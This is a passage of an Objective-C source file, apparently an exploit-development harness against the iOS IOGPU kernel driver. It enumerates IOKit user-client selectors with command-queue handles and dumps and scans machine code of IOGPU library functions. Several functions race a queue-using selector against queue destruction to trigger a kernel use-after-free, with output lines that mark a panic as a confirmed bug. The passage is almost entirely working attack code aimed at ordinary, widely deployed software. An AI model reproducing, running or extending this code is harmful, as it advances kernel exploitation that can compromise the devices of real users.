        if (ur == 0xe00002be) [out appendString:@" NoRes"];
        else if (ur == 0) [out appendString:@" OK"];
        else if (ur == 0xe00002c7) [out appendString:@" NotAcc"];
        else if (ur == 0xe00002cc) [out appendString:@" NoSpace"];
        else [out appendString:@" NEW"];
        [out appendString:@"\n"];
        free(outS);
    }
    [out appendFormat:@"non-BadArg sels with queue handle: %d\n", nonBad];

    // Also try with struct input containing queue handle
    [out appendString:@"\n--- sel sweep with queue handle in struct ---\n"];
    nonBad = 0;
    void *inS = calloc(1, 0x200);
    *(uint64_t *)inS = qid1;
    *(uint64_t *)((uint8_t *)inS + 8) = qid2;
    for (uint32_t sel = 0; sel < 56; sel++) {
        if (sel == 6) continue;
        size_t oc = 0x100;
        void *outS = calloc(1, 0x100);
        kern_return_t r = pCall(conn, sel, NULL, 0, inS, 0x200, NULL, NULL, outS, &oc);
        unsigned ur = (unsigned)r;
        if (ur == 0xe00002c2) { free(outS); continue; }
        nonBad++;
        [out appendFormat:@"sel=%u struct -> 0x%08x", sel, ur];
        if (ur == 0xe00002be) [out appendString:@" NoRes"];
        else if (ur == 0) [out appendString:@" OK"];
        else if (ur == 0xe00002c7) [out appendString:@" NotAcc"];
        else [out appendString:@" NEW"];
        [out appendString:@"\n"];
        free(outS);
    }
    free(inS);
    [out appendFormat:@"non-BadArg sels with queue struct: %d\n", nonBad];

    pQueueRelease(queue);
    pDevRelease(dev);
    pRelease(svc);

    [out appendString:@"\nDONE -- paste this text back\n"];
    [out appendString:@"non-BadArg sels = queue-using methods. Race those vs release.\n"];
    return out;
}

+ (NSString *)runP010IOGPUQueueUAF {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"P010 IOGPU queue UAF -- sel=9 vs IOGPUCommandQueueRelease N=10000\n"];
    [out appendString:@"sel=9 uses queue handle. Release destroys kernel queue.\n"];
    [out appendString:@"Panic = UAF CONFIRMED. Do NOT re-tap if panic.\n\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");

    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    typedef void *(*DevCreate_t)(io_service_t);
    typedef uint32_t (*GetConn_t)(void *);
    typedef void (*DevRelease_t)(void *);
    typedef void *(*QueueCreate_t)(void *, void *, uint32_t);
    typedef void (*QueueRelease_t)(void *);
    DevCreate_t pDevCreate = (DevCreate_t)dlsym(iogpu, "IOGPUDeviceCreate");
    GetConn_t pGetConn = (GetConn_t)dlsym(iogpu, "IOGPUDeviceGetConnect");
    DevRelease_t pDevRelease = (DevRelease_t)dlsym(iogpu, "IOGPUDeviceRelease");
    QueueCreate_t pQueueCreate = (QueueCreate_t)dlsym(iogpu, "IOGPUCommandQueueCreate");
    QueueRelease_t pQueueRelease = (QueueRelease_t)dlsym(iogpu, "IOGPUCommandQueueRelease");

    CFMutableDictionaryRef m = pMatching("IOGPU");
    io_service_t svc = m ? pGet(*pMainPort, m) : 0;
    if (!svc) { [out appendString:@"STOP no service\n"]; return out; }
    void *dev = pDevCreate(svc);
    if (!dev) { [out appendString:@"STOP no dev\n"]; pRelease(svc); return out; }
    io_connect_t conn = pGetConn(dev);

    // Create queue
    void *args = calloc(1, 0x410);
    *(uint32_t *)((uint8_t *)args + 0x400) = *(uint32_t *)((uint8_t *)dev + 0x08);
    *(uint8_t *)((uint8_t *)args + 0x404) = *(uint8_t *)((uint8_t *)dev + 0x08);
    void *queue = pQueueCreate(dev, args, 0x410);
    free(args);
    if (!queue) { [out appendString:@"STOP no queue\n"]; pDevRelease(dev); pRelease(svc); return out; }

    uint64_t qid1 = *(uint64_t *)((uint8_t *)queue + 0x18);
    uint64_t qid2 = *(uint64_t *)((uint8_t *)queue + 0x20);
    [out appendFormat:@"queue=%p conn=%u qid1=0x%llx\n", queue, conn, qid1];

    // Race: sel=9 (uses queue) vs release (destroys queue)
    void *inS = calloc(1, 0x200);
    *(uint64_t *)inS = qid1;
    *(uint64_t *)((uint8_t *)inS + 8) = qid2;
    void *outS = calloc(1, 0x1000);
    const int N = 10000;
    __block volatile int go = 0;
    __block int count = 0;
    __block kern_return_t lastMethod = 0;

    dispatch_queue_t rq = dispatch_queue_create("quaf", NULL);
    dispatch_group_t grp = dispatch_group_create();

    // Thread 1: sel=9 in tight loop (uses queue)
    dispatch_group_async(grp, rq, ^{
        while (!go) { }
        for (int i = 0; i < N; i++) {
            size_t oc = 0x1000;
            lastMethod = pCall(conn, 9, NULL, 0, inS, 0x200, NULL, NULL, outS, &oc);
            count++;
        }
    });

    // Thread 2: release queue after delay (destroys kernel queue)
    dispatch_group_async(grp, rq, ^{
        while (!go) { }
        for (volatile int i = 0; i < 5000; i++) { }
        pQueueRelease(queue);
    });

    go = 1;
    dispatch_group_wait(grp, DISPATCH_TIME_FOREVER);

    [out appendFormat:@"sel=9 calls: %d / %d  last rc: 0x%08x\n", count, N, (unsigned)lastMethod];
    [out appendString:@"survived = race missed. panic = UAF CONFIRMED.\n"];

    free(inS); free(outS);
    pDevRelease(dev);
    pRelease(svc);

    [out appendString:@"\nDONE -- paste this text back\n"];
    [out appendString:@"If survived: try N=100000. If panic: UAF confirmed -- do NOT re-tap.\n"];
    return out;
}

+ (NSString *)runP010IOGPUSel7v9Race {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"P010 sel=7 (destroy) vs sel=9 (use) -- two kernel methods on same UC\n"];
    [out appendString:@"sel=7: 1 scalar (qid1) = destroy queue. sel=9: struct (qid1) = use queue.\n"];
    [out appendString:@"No close, no CF release. Pure kernel method race. Panic = UAF.\n\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");

    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    typedef void *(*DevCreate_t)(io_service_t);
    typedef uint32_t (*GetConn_t)(void *);
    typedef void (*DevRelease_t)(void *);
    typedef void *(*QueueCreate_t)(void *, void *, uint32_t);
    DevCreate_t pDevCreate = (DevCreate_t)dlsym(iogpu, "IOGPUDeviceCreate");
    GetConn_t pGetConn = (GetConn_t)dlsym(iogpu, "IOGPUDeviceGetConnect");
    DevRelease_t pDevRelease = (DevRelease_t)dlsym(iogpu, "IOGPUDeviceRelease");
    QueueCreate_t pQueueCreate = (QueueCreate_t)dlsym(iogpu, "IOGPUCommandQueueCreate");

    CFMutableDictionaryRef m = pMatching("IOGPU");
    io_service_t svc = m ? pGet(*pMainPort, m) : 0;
    if (!svc) { [out appendString:@"STOP no service\n"]; return out; }
    void *dev = pDevCreate(svc);
    if (!dev) { [out appendString:@"STOP no dev\n"]; pRelease(svc); return out; }
    io_connect_t conn = pGetConn(dev);

    void *args = calloc(1, 0x410);
    *(uint32_t *)((uint8_t *)args + 0x400) = *(uint32_t *)((uint8_t *)dev + 0x08);
    *(uint8_t *)((uint8_t *)args + 0x404) = *(uint8_t *)((uint8_t *)dev + 0x08);
    void *queue = pQueueCreate(dev, args, 0x410);
    free(args);
    if (!queue) { [out appendString:@"STOP no queue\n"]; pDevRelease(dev); pRelease(svc); return out; }

    uint64_t qid1 = *(uint64_t *)((uint8_t *)queue + 0x18);
    [out appendFormat:@"queue=%p conn=%u qid1=0x%llx\n\n", queue, conn, qid1];

    void *inS9 = calloc(1, 0x200);
    *(uint64_t *)inS9 = qid1;
    void *outS = calloc(1, 0x1000);
    const int N = 10000;
    __block volatile int go = 0;
    __block int count9 = 0;
    __block kern_return_t last9 = 0, r7 = 0;

    dispatch_queue_t rq = dispatch_queue_create("s7v9", NULL);
    dispatch_group_t grp = dispatch_group_create();

    // Thread 1: sel=9 (use queue) in tight loop
    dispatch_group_async(grp, rq, ^{
        while (!go) { }
        for (int i = 0; i < N; i++) {
            size_t oc = 0x1000;
            last9 = pCall(conn, 9, NULL, 0, inS9, 0x200, NULL, NULL, outS, &oc);
            count9++;
        }
    });

    // Thread 2: sel=7 (destroy queue) with 1 scalar after delay
    dispatch_group_async(grp, rq, ^{
        while (!go) { }
        for (volatile int i = 0; i < 5000; i++) { }
        uint64_t sc = qid1;
        r7 = pCall(conn, 7, &sc, 1, NULL, 0, NULL, NULL, NULL, NULL);
    });

    go = 1;
    dispatch_group_wait(grp, DISPATCH_TIME_FOREVER);

    [out appendFormat:@"sel=9 calls: %d / %d  last rc: 0x%08x\n", count9, N, (unsigned)last9];
    [out appendFormat:@"sel=7 (destroy) rc: 0x%08x\n", (unsigned)r7];
    [out appendString:@"survived = race missed. panic = UAF CONFIRMED.\n"];

    free(inS9); free(outS);
    pDevRelease(dev);
    pRelease(svc);

    [out appendString:@"\nDONE -- paste this text back\n"];
    [out appendString:@"If survived: try N=100000. If panic: UAF -- do NOT re-tap.\n"];
    return out;
}

+ (NSString *)runP010IOGPUDestroyProbe {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"P010 destroy probe -- find destroy selector on 22H311\n"];
    [out appendString:@"Try all sels with 1 scalar (qid1) + struct (qid1).\n\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");

    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    typedef void *(*DevCreate_t)(io_service_t);
    typedef uint32_t (*GetConn_t)(void *);
    typedef void (*DevRelease_t)(void *);
    typedef void *(*QueueCreate_t)(void *, void *, uint32_t);
    DevCreate_t pDevCreate = (DevCreate_t)dlsym(iogpu, "IOGPUDeviceCreate");
    GetConn_t pGetConn = (GetConn_t)dlsym(iogpu, "IOGPUDeviceGetConnect");
    DevRelease_t pDevRelease = (DevRelease_t)dlsym(iogpu, "IOGPUDeviceRelease");
    QueueCreate_t pQueueCreate = (QueueCreate_t)dlsym(iogpu, "IOGPUCommandQueueCreate");

    CFMutableDictionaryRef m = pMatching("IOGPU");
    io_service_t svc = m ? pGet(*pMainPort, m) : 0;
    if (!svc) { [out appendString:@"STOP no service\n"]; return out; }
    void *dev = pDevCreate(svc);
    if (!dev) { [out appendString:@"STOP no dev\n"]; pRelease(svc); return out; }
    io_connect_t conn = pGetConn(dev);

    void *args = calloc(1, 0x410);
    *(uint32_t *)((uint8_t *)args + 0x400) = *(uint32_t *)((uint8_t *)dev + 0x08);
    *(uint8_t *)((uint8_t *)args + 0x404) = *(uint8_t *)((uint8_t *)dev + 0x08);
    void *queue = pQueueCreate(dev, args, 0x410);
    free(args);
    if (!queue) { [out appendString:@"STOP no queue\n"]; pDevRelease(dev); pRelease(svc); return out; }

    uint64_t qid1 = *(uint64_t *)((uint8_t *)queue + 0x18);
    [out appendFormat:@"queue=%p conn=%u qid1=0x%llx\n\n", queue, conn, qid1];

    // Phase 1: all sels with 1 scalar (qid1 only)
    [out appendString:@"--- 1 scalar (qid1) ---\n"];
    for (uint32_t sel = 0; sel < 56; sel++) {
        if (sel == 6) continue;
        uint64_t sc = qid1;
        size_t oc = 0x100;
        void *outS = calloc(1, 0x100);
        kern_return_t r = pCall(conn, sel, &sc, 1, NULL, 0, NULL, NULL, outS, &oc);
        unsigned ur = (unsigned)r;
        if (ur == 0xe00002c2) { free(outS); continue; }
        [out appendFormat:@"sel=%u 1scalar -> 0x%08x", sel, ur];
        if (ur == 0xe00002be) [out appendString:@" NoRes"];
        else if (ur == 0) [out appendString:@" OK"];
        else if (ur == 0xe00002c7) [out appendString:@" NotAcc"];
        else [out appendString:@" NEW"];
        [out appendString:@"\n"];
        free(outS);
    }

    // Phase 2: all sels with struct containing qid1 (various sizes)
    [out appendString:@"\n--- struct (qid1 at offset 0) ---\n"];
    int sizes[] = {8, 16, 32, 64, 128, 256, 512};
    int nSizes = (int)(sizeof(sizes) / sizeof(sizes[0]));
    for (uint32_t sel = 0; sel < 56; sel++) {
        if (sel == 6 || sel == 9) continue; // skip create and known use
        for (int si = 0; si < nSizes; si++) {
            void *inS = calloc(1, sizes[si]);
            *(uint64_t *)inS = qid1;
            size_t oc = 0x100;
            void *outS = calloc(1, 0x100);
            kern_return_t r = pCall(conn, sel, NULL, 0, inS, sizes[si], NULL, NULL, outS, &oc);
            unsigned ur = (unsigned)r;
            if (ur != 0xe00002c2) {
                [out appendFormat:@"sel=%u struct=%d -> 0x%08x", sel, sizes[si], ur];
                if (ur == 0xe00002be) [out appendString:@" NoRes"];
                else if (ur == 0) [out appendString:@" OK"];
                else [out appendString:@" NEW"];
                [out appendString:@"\n"];
            }
            free(inS); free(outS);
        }
    }

    pDevRelease(dev);
    pRelease(svc);

    [out appendString:@"\nDONE -- paste this text back\n"];
    [out appendString:@"OK/NEW = destroy candidate. Race vs sel=9 for UAF.\n"];
    return out;
}

+ (NSString *)runP010IOGPUDestroyProbe2 {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"P010 destroy probe v2 -- qid2 + alternate struct offsets\n\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");

    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    typedef void *(*DevCreate_t)(io_service_t);
    typedef uint32_t (*GetConn_t)(void *);
    typedef void (*DevRelease_t)(void *);
    typedef void *(*QueueCreate_t)(void *, void *, uint32_t);
    DevCreate_t pDevCreate = (DevCreate_t)dlsym(iogpu, "IOGPUDeviceCreate");
    GetConn_t pGetConn = (GetConn_t)dlsym(iogpu, "IOGPUDeviceGetConnect");
    DevRelease_t pDevRelease = (DevRelease_t)dlsym(iogpu, "IOGPUDeviceRelease");
    QueueCreate_t pQueueCreate = (QueueCreate_t)dlsym(iogpu, "IOGPUCommandQueueCreate");

    CFMutableDictionaryRef m = pMatching("IOGPU");
    io_service_t svc = m ? pGet(*pMainPort, m) : 0;
    if (!svc) { [out appendString:@"STOP no service\n"]; return out; }
    void *dev = pDevCreate(svc);
    if (!dev) { [out appendString:@"STOP no dev\n"]; pRelease(svc); return out; }
    io_connect_t conn = pGetConn(dev);

    void *args = calloc(1, 0x410);
    *(uint32_t *)((uint8_t *)args + 0x400) = *(uint32_t *)((uint8_t *)dev + 0x08);
    *(uint8_t *)((uint8_t *)args + 0x404) = *(uint8_t *)((uint8_t *)dev + 0x08);
    void *queue = pQueueCreate(dev, args, 0x410);
    free(args);
    if (!queue) { [out appendString:@"STOP no queue\n"]; pDevRelease(dev); pRelease(svc); return out; }

    uint64_t qid1 = *(uint64_t *)((uint8_t *)queue + 0x18);
    uint64_t qid2 = *(uint64_t *)((uint8_t *)queue + 0x20);
    [out appendFormat:@"qid1=0x%llx qid2=0x%llx\n\n", qid1, qid2];

    // Phase 1: all sels with 1 scalar = qid2
    [out appendString:@"--- 1 scalar (qid2) ---\n"];
    for (uint32_t sel = 0; sel < 56; sel++) {
        if (sel == 6) continue;
        uint64_t sc = qid2;
        size_t oc = 0x100;
        void *outS = calloc(1, 0x100);
        kern_return_t r = pCall(conn, sel, &sc, 1, NULL, 0, NULL, NULL, outS, &oc);
        unsigned ur = (unsigned)r;
        if (ur != 0xe00002c2) {
            [out appendFormat:@"sel=%u qid2 -> 0x%08x", sel, ur];
            if (ur == 0) [out appendString:@" OK"];
            else if (ur == 0xe00002be) [out appendString:@" NoRes"];
            else [out appendString:@" NEW"];
            [out appendString:@"\n"];
        }
        free(outS);
    }

    // Phase 2: all sels with struct: qid1 at offset 8 (type at offset 0 = 1)
    [out appendString:@"\n--- struct: type=1 @0, qid1 @8 ---\n"];
    for (uint32_t sel = 0; sel < 56; sel++) {
        if (sel == 6 || sel == 9) continue;
        void *inS = calloc(1, 64);
        *(uint32_t *)inS = 1;
        *(uint64_t *)((uint8_t *)inS + 8) = qid1;
        size_t oc = 0x100;
        void *outS = calloc(1, 0x100);
        kern_return_t r = pCall(conn, sel, NULL, 0, inS, 64, NULL, NULL, outS, &oc);
        unsigned ur = (unsigned)r;
        if (ur != 0xe00002c2) {
            [out appendFormat:@"sel=%u -> 0x%08x", sel, ur];
            if (ur == 0) [out appendString:@" OK"];
            else if (ur == 0xe00002be) [out appendString:@" NoRes"];
            else [out appendString:@" NEW"];
            [out appendString:@"\n"];
        }
        free(inS); free(outS);
    }

    // Phase 3: all sels with struct: qid2 at offset 0
    [out appendString:@"\n--- struct: qid2 @0 ---\n"];
    for (uint32_t sel = 0; sel < 56; sel++) {
        if (sel == 6 || sel == 9) continue;
        void *inS = calloc(1, 64);
        *(uint64_t *)inS = qid2;
        size_t oc = 0x100;
        void *outS = calloc(1, 0x100);
        kern_return_t r = pCall(conn, sel, NULL, 0, inS, 64, NULL, NULL, outS, &oc);
        unsigned ur = (unsigned)r;
        if (ur != 0xe00002c2) {
            [out appendFormat:@"sel=%u qid2struct -> 0x%08x", sel, ur];
            if (ur == 0) [out appendString:@" OK"];
            else if (ur == 0xe00002be) [out appendString:@" NoRes"];
            else [out appendString:@" NEW"];
            [out appendString:@"\n"];
        }
        free(inS); free(outS);
    }

    // Phase 4: dump more of the queue object (0x100 bytes)
    [out appendString:@"\n--- queue object dump (0x100 bytes) ---\n"];
    uint8_t *qb = (uint8_t *)queue;
    for (int i = 0; i < 0x100; i += 16) {
        NSMutableString *line = [NSMutableString string];
        [line appendFormat:@"0x%02x:", i];
        for (int j = 0; j < 16; j++)
            [line appendFormat:@" %02x", qb[i+j]];
        [out appendString:line];
        [out appendString:@"\n"];
    }

    pDevRelease(dev);
    pRelease(svc);

    [out appendString:@"\nDONE -- paste this text back\n"];
    [out appendString:@"OK/NEW = destroy candidate. Race vs sel=9.\n"];
    return out;
}

+ (NSString *)runP010DumpFinalize {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"P010 dump finalize -- find destroy selector on 22H311\n\n"];

    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!iogpu) { [out appendString:@"STOP no IOGPU\n"]; return out; }

    // Get IOGPUCommandQueueRelease -- this calls CFRelease → finalize
    typedef void (*QueueRelease_t)(void *);
    QueueRelease_t pQueueRelease = (QueueRelease_t)dlsym(iogpu, "IOGPUCommandQueueRelease");
    if (!pQueueRelease) { [out appendString:@"STOP no queueRelease sym\n"]; return out; }

    [out appendFormat:@"queueRelease=0x%llx\n", (uint64_t)pQueueRelease];

    // Dump 0x400 bytes of queueRelease
    uint8_t *p = (uint8_t *)pQueueRelease;
    [out appendString:@"\n--- queueRelease bytes (0x400) ---\n"];
    for (int i = 0; i < 0x400; i += 16) {
        NSMutableString *line = [NSMutableString string];
        [line appendFormat:@"%03x:", i];
        for (int j = 0; j < 16; j++)
            [line appendFormat:@" %02x", p[i+j]];
        [out appendString:line];
        [out appendString:@"\n"];
    }

    // Also try to find IOGPUCommandQueueCreate and dump it
    // to understand the sel=6 call pattern, then compare with
    // what sel the release uses
    typedef void *(*QueueCreate_t)(void *, void *, uint32_t);
    QueueCreate_t pQueueCreate = (QueueCreate_t)dlsym(iogpu, "IOGPUCommandQueueCreate");
    if (pQueueCreate) {
        [out appendFormat:@"\nqueueCreate=0x%llx\n", (uint64_t)pQueueCreate];
        uint8_t *cp = (uint8_t *)pQueueCreate;
        [out appendString:@"\n--- queueCreate bytes (0x200) ---\n"];
        for (int i = 0; i < 0x200; i += 16) {
            NSMutableString *line = [NSMutableString string];
            [line appendFormat:@"%03x:", i];
            for (int j = 0; j < 16; j++)
                [line appendFormat:@" %02x", cp[i+j]];
            [out appendString:line];
            [out appendString:@"\n"];
        }
    }

    // Search for "mov w1, #imm" pattern in queueRelease
    // ARM64: MOV W1, #imm16 = 0x52800021 | (imm16 << 5)
    // Or MOVZ W1, #imm16 = 0x52800001 | (imm16 << 5)
    [out appendString:@"\n--- mov w1, #imm in queueRelease ---\n"];
    for (int i = 0; i < 0x400; i += 4) {
        uint32_t inst = *(uint32_t *)(p + i);
        // MOVZ Wn, #imm16: 0101 0010 1xx0 0000 0000 0000 0000 0000
        // For W1: Rd=1
        uint32_t op = inst & 0xff800000;
        if (op == 0x52800000) {  // MOVZ Wn, #imm16
            uint32_t rd = inst & 0x1f;
            uint32_t imm = (inst >> 5) & 0xffff;
            if (rd == 1) {
                [out appendFormat:@"  0x%03x: mov w1, #%u (0x%x)\n", i, imm, imm];
            }
        }
    }

    [out appendString:@"\nDONE -- paste this text back\n"];
    return out;
}


+ (NSString *)runP010TestDestroySels {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"P010 test destroy sels -- sel=8 (1 scalar) + sel=13 (2 scalars)\n\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");

    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    typedef void *(*DevCreate_t)(io_service_t);
    typedef uint32_t (*GetConn_t)(void *);
    typedef void (*DevRelease_t)(void *);
    typedef void *(*QueueCreate_t)(void *, void *, uint32_t);
    DevCreate_t pDevCreate = (DevCreate_t)dlsym(iogpu, "IOGPUDeviceCreate");
    GetConn_t pGetConn = (GetConn_t)dlsym(iogpu, "IOGPUDeviceGetConnect");
    DevRelease_t pDevRelease = (DevRelease_t)dlsym(iogpu, "IOGPUDeviceRelease");
    QueueCreate_t pQueueCreate = (QueueCreate_t)dlsym(iogpu, "IOGPUCommandQueueCreate");

    CFMutableDictionaryRef m = pMatching("IOGPU");
    io_service_t svc = m ? pGet(*pMainPort, m) : 0;
    if (!svc) { [out appendString:@"STOP no service\n"]; return out; }
    void *dev = pDevCreate(svc);
    if (!dev) { [out appendString:@"STOP no dev\n"]; pRelease(svc); return out; }
    io_connect_t conn = pGetConn(dev);

    // Create queue 1
    void *args = calloc(1, 0x410);
    *(uint32_t *)((uint8_t *)args + 0x400) = *(uint32_t *)((uint8_t *)dev + 0x08);
    *(uint8_t *)((uint8_t *)args + 0x404) = *(uint8_t *)((uint8_t *)dev + 0x08);
    void *queue1 = pQueueCreate(dev, args, 0x410);
    free(args);
    if (!queue1) { [out appendString:@"STOP no queue\n"]; pDevRelease(dev); pRelease(svc); return out; }

    uint64_t qid1 = *(uint64_t *)((uint8_t *)queue1 + 0x18);
    uint64_t qid2 = *(uint64_t *)((uint8_t *)queue1 + 0x20);
    [out appendFormat:@"queue1=0x%llx qid1=0x%llx qid2=0x%llx\n\n", (uint64_t)queue1, qid1, qid2];

    // Test sel=8 with 1 scalar (qid1) -- from finalize dump
    {
        uint64_t sc = qid1;
        size_t oc = 0x100;
        void *outS = calloc(1, 0x100);
        kern_return_t r = pCall(conn, 8, &sc, 1, NULL, 0, NULL, NULL, outS, &oc);
        [out appendFormat:@"sel=8  1 scalar (qid1=0x%llx) -> 0x%08x", qid1, (unsigned)r];
        if ((unsigned)r == 0) [out appendString:@" OK"];
        else if ((unsigned)r == 0xe00002be) [out appendString:@" NoRes"];
        else if ((unsigned)r == 0xe00002c2) [out appendString:@" BadArg"];
        else [out appendString:@" NEW"];
        [out appendString:@"\n"];
        free(outS);
    }

    // Test sel=8 with 1 scalar (qid2)
    {
        uint64_t sc = qid2;
        size_t oc = 0x100;
        void *outS = calloc(1, 0x100);
        kern_return_t r = pCall(conn, 8, &sc, 1, NULL, 0, NULL, NULL, outS, &oc);
        [out appendFormat:@"sel=8  1 scalar (qid2=0x%llx) -> 0x%08x", qid2, (unsigned)r];
        if ((unsigned)r == 0) [out appendString:@" OK"];
        else if ((unsigned)r == 0xe00002be) [out appendString:@" NoRes"];
        else if ((unsigned)r == 0xe00002c2) [out appendString:@" BadArg"];
        else [out appendString:@" NEW"];
        [out appendString:@"\n"];
        free(outS);
    }

    // Test sel=13 with 2 scalars (qid1, qid2)
    {
        uint64_t sc[2] = {qid1, qid2};
        size_t oc = 0x100;
        void *outS = calloc(1, 0x100);
        kern_return_t r = pCall(conn, 13, sc, 2, NULL, 0, NULL, NULL, outS, &oc);
        [out appendFormat:@"sel=13 2 scalars (qid1,qid2) -> 0x%08x", (unsigned)r];
        if ((unsigned)r == 0) [out appendString:@" OK"];
        else if ((unsigned)r == 0xe00002be) [out appendString:@" NoRes"];
        else if ((unsigned)r == 0xe00002c2) [out appendString:@" BadArg"];
        else [out appendString:@" NEW"];
        [out appendString:@"\n"];
        free(outS);
    }

    // Test sel=13 with 2 scalars (qid2, qid1)
    {
        uint64_t sc[2] = {qid2, qid1};
        size_t oc = 0x100;
        void *outS = calloc(1, 0x100);
        kern_return_t r = pCall(conn, 13, sc, 2, NULL, 0, NULL, NULL, outS, &oc);
        [out appendFormat:@"sel=13 2 scalars (qid2,qid1) -> 0x%08x", (unsigned)r];
        if ((unsigned)r == 0) [out appendString:@" OK"];
        else if ((unsigned)r == 0xe00002be) [out appendString:@" NoRes"];
        else if ((unsigned)r == 0xe00002c2) [out appendString:@" BadArg"];
        else [out appendString:@" NEW"];
        [out appendString:@"\n"];
        free(outS);
    }

    // Now try: create queue2, call sel=8 on queue1's qid1,
    // then check if queue1 still works (sel=9 returns NoRes
    // = alive, BadArg = destroyed)
    void *args2 = calloc(1, 0x410);
    *(uint32_t *)((uint8_t *)args2 + 0x400) = *(uint32_t *)((uint8_t *)dev + 0x08);
    *(uint8_t *)((uint8_t *)args2 + 0x404) = *(uint8_t *)((uint8_t *)dev + 0x08);
    void *queue2 = pQueueCreate(dev, args2, 0x410);
    free(args2);
    if (queue2) {
        uint64_t q2id1 = *(uint64_t *)((uint8_t *)queue2 + 0x18);
        [out appendFormat:@"\nqueue2 qid1=0x%llx\n", q2id1];
        // Call sel=8 with queue1's qid1 -- if it destroys, queue1's sel=9 will change
        uint64_t sc = qid1;
        size_t oc = 0x100;
        void *outS = calloc(1, 0x100);
        kern_return_t r = pCall(conn, 8, &sc, 1, NULL, 0, NULL, NULL, outS, &oc);
        [out appendFormat:@"sel=8 (destroy queue1?) -> 0x%08x\n", (unsigned)r];
        free(outS);
        // Now test sel=9 on queue1 -- if BadArg, queue was destroyed
        void *inS = calloc(1, 128);
        *(uint64_t *)inS = qid1;
        size_t oc2 = 0x100;
        void *outS2 = calloc(1, 0x100);
        kern_return_t r2 = pCall(conn, 9, NULL, 0, inS, 128, NULL, NULL, outS2, &oc2);
        [out appendFormat:@"sel=9 after sel=8 -> 0x%08x", (unsigned)r2];
        if ((unsigned)r2 == 0xe00002be) [out appendString:@" NoRes (queue ALIVE)"];
        else if ((unsigned)r2 == 0xe00002c2) [out appendString:@" BadArg (queue DEAD)"];
        else [out appendString:@" ???"];
        [out appendString:@"\n"];
        free(inS); free(outS2);
    }

    pDevRelease(dev);
    pRelease(svc);

    [out appendString:@"\nDONE -- paste this text back\n"];
    [out appendString:@"OK/NEW on sel=8 = destroy found. Race vs sel=9.\n"];
    return out;
}

+ (NSString *)runP010FollowFinalize {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"P010 follow finalize branch -- find real destroy sel\n\n"];

    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!iogpu) { [out appendString:@"STOP no IOGPU\n"]; return out; }

    typedef void (*QueueRelease_t)(void *);
    QueueRelease_t pQueueRelease = (QueueRelease_t)dlsym(iogpu, "IOGPUCommandQueueRelease");
